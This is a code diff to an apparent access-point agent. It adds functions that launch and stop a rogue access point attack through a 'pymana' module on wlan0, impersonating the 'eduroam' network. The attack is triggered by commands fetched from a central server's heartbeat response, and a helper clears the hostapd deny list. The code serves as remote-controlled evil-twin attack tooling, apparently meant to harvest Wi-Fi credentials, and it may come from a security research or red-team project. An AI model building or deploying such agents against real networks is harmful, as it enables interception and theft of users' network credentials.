@@ -164,6 +164,45 @@ def private_key_decryption(data):
     
     return plain_data
 
+def start_attack():
+    global g_central_ip, g_agent_id, g_agent_area, g_is_attacking, g_attack_process, g_queue
+
+    if g_is_attacking:
+        return
+
+    # clear queue
+    while not g_queue.empty():
+        g_queue.get()
+
+    g_attack_process = Process(target=pymana.main, args=("wlan0", g_agent_area, "eduroam", g_agent_area, g_central_ip, g_queue,))
+    g_attack_process.start()
+
+    message = g_queue.get()
+    if message != 'Pymana started':
+        return
+
+    g_is_attacking = True
+
+def stop_attack():
+    global g_agent_id, g_is_attacking, g_attack_process
+
+    if not g_is_attacking:
+        return
+    
+    stop_process('hostapd')
+    g_is_attacking = False
+
+def clear_deny_list():
+    global g_agent_id, g_is_attacking
+
+    # clear deny list
+    with open(f"pymana/hostapd.deny", 'w'):
+        pass
+
+    if g_is_attacking:
+        # reload hostapd configs
+        exec_cmd("kill -1 $(pidof hostapd)")
+
 #####################################
 # Periodic functions                #
 #####################################
@@ -192,6 +231,19 @@ def heartbeat_central():
                 #print(f"New agent_id: {g_agent_id}")
             elif 'last_heartbeat' not in plain_data:
                 print('(ERROR) APAgent: Bad heartbeat response', flush=True)
+
+            if 'pending_request' in plain_data and is_int(plain_data['pending_request']):
+                action_start = 1 << 0
+                action_stop = 1 << 1
+                action_clear = 1 << 2
+
+                if plain_data['pending_request'] & action_start:
+                    start_attack()
+                elif plain_data['pending_request'] & action_stop:
+                    stop_attack()
+                if plain_data['pending_request'] & action_clear:
+                    clear_deny_list()
+
         except ValueError as e:
             #print(e)
             print("(ERROR) APAgent: Response is not a valid json format", flush=True)
@@ -210,12 +262,12 @@ def heartbeat_central():
 #####################################
 
 @app.get('/agent-heartbeat-api')
-def agent_heartbeat():
+def agent_heartbeat_api():
     global g_agent_id, g_is_attacking
     return jsonify(public_key_encryption({'message': 'Heartbeat received.', 'agent_id': g_agent_id, 'is_attacking': g_is_attacking})), 200
 
 @app.post('/start-attack-api')
-def start_attack():
+def start_attack_api():
     global g_ap_iface, g_central_ip, g_agent_id, g_agent_area, g_is_attacking, g_attack_process, g_queue
 
     content = request.get_json()
@@ -244,7 +296,7 @@ def start_attack():
     return jsonify(public_key_encryption({'message': 'Attack started.'})), 200
 
 @app.post('/stop-attack-api')
-def stop_attack():
+def stop_attack_api():
     global g_agent_id, g_is_attacking, g_attack_process
 
     content = request.get_json()
@@ -264,7 +316,7 @@ def stop_attack():
 
 
 @app.post('/clear-deny-list-api')
-def clear_deny_list():
+def clear_deny_list_api():
     global g_agent_id, g_is_attacking
 
     content = request.get_json()
